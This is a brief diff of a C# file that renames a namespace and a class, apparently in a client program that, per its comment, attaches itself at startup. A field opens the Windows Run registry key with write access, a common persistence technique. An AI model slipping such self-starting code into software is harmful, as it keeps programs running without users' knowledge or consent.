@@ -7,12 +7,12 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Client.Armitage
+namespace Client.Armitage.Startup
 {
     /// <summary>
     /// A class containing methods to attach itself at startup.
     /// </summary>
-    public static class Startup
+    public static class Task_Scheduler
     {
         private static RegistryKey RegistryStartupFolder =
             Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
